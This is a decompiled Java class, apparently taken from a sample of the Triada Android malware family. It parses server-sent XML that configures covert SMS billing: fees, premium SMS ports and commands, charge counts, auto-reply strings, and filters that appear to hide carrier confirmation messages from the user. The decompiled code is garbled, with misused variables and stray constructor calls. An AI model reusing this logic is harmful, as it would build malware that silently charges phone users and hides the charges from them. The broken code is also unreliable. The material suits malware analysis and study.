package com.android.essdk.eyou.d;

import android.content.Context;
import android.util.Xml;
import com.android.essdk.eyou.a.b;
import com.android.essdk.eyou.a.d;
import com.android.essdk.eyou.a.e;
import com.android.essdk.eyou.a.f;
import com.android.essdk.eyou.a.g;
import com.android.essdk.eyou.a.h;
import com.android.essdk.eyou.b.e;
import com.android.essdk.eyou.e.b;
import com.android.essdk.eyou.ui.FeeView;
import java.io.IOException;
import java.io.StringReader;
import java.util.ArrayList;
import java.util.List;
import org.xmlpull.v1.XmlPullParser;
import org.xmlpull.v1.XmlPullParserException;

public class a {
  private List a;
  
  private b b;
  
  private f c;
  
  private Context d;
  
  private String e;
  
  private void a(XmlPullParser paramXmlPullParser) {
    this.a = new ArrayList();
  }
  
  private void b(XmlPullParser paramXmlPullParser) {
    String str = paramXmlPullParser.getName();
    b.a("EpayXMLParser", "start_tag " + str);
    if (!str.equals("root") && !str.equals("procedure_1") && !str.equals("mutual") && !str.equals("gateway")) {
      String str1 = paramXmlPullParser.nextText();
    } else {
      paramXmlPullParser = null;
    } 
    try {
      StringBuilder stringBuilder1;
      StringBuilder stringBuilder2 = new StringBuilder();
      this("value ");
      b.a("EpayXMLParser", stringBuilder2.append((String)paramXmlPullParser).toString());
      if (str.equalsIgnoreCase("order_id")) {
        e.h(this.d, (String)paramXmlPullParser);
        stringBuilder1 = new StringBuilder();
        this("OrderId ");
        b.a("EpayXMLParser", stringBuilder1.append(e.g(this.d)).toString());
        return;
      } 
      if (!str.equalsIgnoreCase("version")) {
        if (str.equalsIgnoreCase("fee_type")) {
          e.c(this.d, Integer.parseInt((String)stringBuilder1));
          return;
        } 
        if (str.equalsIgnoreCase("call_interval")) {
          e.a(this.d, Integer.parseInt((String)stringBuilder1));
          return;
        } 
        if (str.equalsIgnoreCase("call_max")) {
          e.b(this.d, Integer.parseInt((String)stringBuilder1));
          return;
        } 
        if (str.equalsIgnoreCase("fee")) {
          e.a(this.d, (String)stringBuilder1);
          return;
        } 
        if (str.equalsIgnoreCase("prod_name")) {
          e.b(this.d, (String)stringBuilder1);
          return;
        } 
        if (str.equalsIgnoreCase("supp_name")) {
          e.c(this.d, (String)stringBuilder1);
          return;
        } 
        if (str.equalsIgnoreCase("view_url")) {
          FeeView.d = (String)stringBuilder1;
          return;
        } 
        if (!str.equalsIgnoreCase("gateway")) {
          g g;
          StringBuilder stringBuilder;
          if (str.equalsIgnoreCase("op")) {
            this.e = (String)stringBuilder1;
            return;
          } 
          if (str.equalsIgnoreCase("fee_mode")) {
            h h;
            d d;
            if (stringBuilder1.equalsIgnoreCase("0")) {
              h = new h();
              this();
              this.b = (b)h;
              ((h)this.b).a(true);
              return;
            } 
            if (h.equalsIgnoreCase("7")) {
              h = new h();
              this();
              this.b = (b)h;
              ((h)this.b).a(false);
              return;
            } 
            if (h.equalsIgnoreCase("10")) {
              if (this.e.equals("2")) {
                d = new d();
                this();
                this.b = (b)d;
              } 
              return;
            } 
            if (d.equalsIgnoreCase("13")) {
              e e = new e();
              this();
              this.b = (b)e;
              return;
            } 
            g = new g();
            this();
            this.b = (b)g;
            return;
          } 
          if (str.equalsIgnoreCase("is_pop")) {
            e.d(this.d, Integer.parseInt((String)g));
            return;
          } 
          if (str.equalsIgnoreCase("cmd")) {
            if (this.b instanceof h)
              ((h)this.b).d((String)g); 
            return;
          } 
          if (str.equalsIgnoreCase("port")) {
            if (this.b instanceof h)
              ((h)this.b).e((String)g); 
            return;
          } 
          if (str.equalsIgnoreCase("is_filter")) {
            this.b.a((String)g);
            return;
          } 
          if (str.equalsIgnoreCase("is_second")) {
            if (this.b instanceof h)
              ((h)this.b).b(Integer.parseInt((String)g)); 
            return;
          } 
          if (str.equalsIgnoreCase("filter_port")) {
            this.b.b((String)g);
            return;
          } 
          if (str.equalsIgnoreCase("filter_info")) {
            stringBuilder = new StringBuilder();
            this("需要过滤的信息为");
            b.b("EpayXMLParser", stringBuilder.append((String)g).toString());
            this.b.c((String)g);
            return;
          } 
          if (stringBuilder.equalsIgnoreCase("second_type")) {
            boolean bool = this.b instanceof h;
            if (bool)
              try {
                ((h)this.b).c(Integer.parseInt((String)g));
              } catch (Exception exception) {} 
            return;
          } 
          if (stringBuilder.equalsIgnoreCase("second_port")) {
            if (this.b instanceof h)
              ((h)this.b).f((String)exception); 
            return;
          } 
          if (stringBuilder.equalsIgnoreCase("reply_start_str")) {
            if (this.b instanceof h)
              ((h)this.b).g((String)exception); 
            return;
          } 
          if (stringBuilder.equalsIgnoreCase("reply_end_str")) {
            if (this.b instanceof h)
              ((h)this.b).h((String)exception); 
            return;
          } 
          if (stringBuilder.equalsIgnoreCase("reply_content")) {
            if (this.b instanceof h)
              ((h)this.b).i((String)exception); 
            return;
          } 
          if (stringBuilder.equalsIgnoreCase("charge_count")) {
            if (this.b instanceof h)
              ((h)this.b).d(Integer.parseInt((String)exception)); 
            return;
          } 
          if (stringBuilder.equalsIgnoreCase("sms_delay_time")) {
            if (this.b instanceof h && !exception.trim().equals(""))
              ((h)this.b).e(Integer.parseInt((String)exception)); 
            return;
          } 
          if (!stringBuilder.equalsIgnoreCase("mutual")) {
            f f1;
            if (stringBuilder.equalsIgnoreCase("procedure_1")) {
              f1 = new f();
              this();
              this.c = f1;
              return;
            } 
            if (stringBuilder.equalsIgnoreCase("a_url_1")) {
              if (this.c != null)
                this.c.a((String)f1); 
              return;
            } 
            if (stringBuilder.equalsIgnoreCase("timer_1")) {
              if (this.c != null)
                this.c.a(Integer.parseInt((String)f1)); 
              return;
            } 
            if (stringBuilder.equalsIgnoreCase("type_1")) {
              if (this.c != null)
                this.c.b(Integer.parseInt((String)f1)); 
              return;
            } 
            if (stringBuilder.equalsIgnoreCase("sms_num_1") && this.c != null)
              this.c.b((String)f1); 
          } 
        } 
      } 
    } catch (Exception exception) {
      b.f("EpayXMLParser", "协议解析属性错误" + exception.getMessage());
    } 
  }
  
  private void c(XmlPullParser paramXmlPullParser) {
    String str = paramXmlPullParser.getName();
    b.a("EpayXMLParser", "end_tag " + str);
    if (str.equalsIgnoreCase("gateway")) {
      if (this.a != null && this.b != null) {
        this.a.add(this.b);
        b.a("EpayXMLParser", "endTag+allFees" + this.a.size());
      } 
      return;
    } 
    if (str.equalsIgnoreCase("procedure_1")) {
      if (this.b instanceof g) {
        b.a("EpayXMLParser", "currentProed is " + this.c);
        ((g)this.b).e().add(this.c);
      } 
      return;
    } 
    if (str.equalsIgnoreCase("root"))
      b.a("EpayXMLParser", "已经完成"); 
  }
  
  public List a(StringReader paramStringReader, Context paramContext) {
    this.d = paramContext;
    XmlPullParser xmlPullParser = Xml.newPullParser();
    try {
      xmlPullParser.setInput(paramStringReader);
      int i = xmlPullParser.getEventType();
      while (true) {
        if (i == 1) {
          paramStringReader.close();
          return this.a;
        } 
        switch (i) {
          case 0:
            a(xmlPullParser);
            i = xmlPullParser.next();
            break;
          case 2:
            b.a("EpayXMLParser", "解析startTag");
            b(xmlPullParser);
            i = xmlPullParser.next();
            break;
          case 3:
            b.a("EpayXMLParser", "解析endTag");
            c(xmlPullParser);
            i = xmlPullParser.next();
            break;
        } 
      } 
    } catch (XmlPullParserException xmlPullParserException) {
      xmlPullParserException.printStackTrace();
      b.f("epay", "解析文档失败　XmlPullParserException　" + xmlPullParserException.getMessage());
    } catch (IOException iOException) {
      iOException.printStackTrace();
      b.f("epay", "解析文档失败　IOException" + iOException.getMessage());
    } 
    return this.a;
  }
}


/* Location:              /home/fahim/Desktop/triada1-dex2jar.jar!/com/android/essdk/eyou/d/a.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */